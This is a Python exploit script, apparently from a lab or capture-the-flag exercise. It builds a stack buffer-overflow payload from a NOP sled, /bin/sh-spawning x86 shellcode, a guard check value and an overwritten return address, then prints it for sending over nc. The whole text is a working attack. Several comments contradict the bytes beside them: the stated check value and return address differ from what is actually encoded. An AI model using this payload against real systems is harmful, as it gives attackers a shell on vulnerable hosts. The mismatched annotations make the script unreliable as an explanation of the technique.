import sys
payload = b''
payload += b'\x90' * (520 - 41 - 4) # Add nop sled.
payload += b'\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
# Add shell code.
payload += b'\xef\xcd\x76\x98' # Convert check element as 0x9876cdaf in little endian manner.
payload += b'\x0c\xf4\xff\xbf' # Fill old ebp area as any value.
# $esp = 0xbffff204
payload += b'\xb4\xc4\xff\xff' # Change ret addr as 0xbffff414 which is start addr of buf in little endian manner.
# $ebp = 0xbffff40c
sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer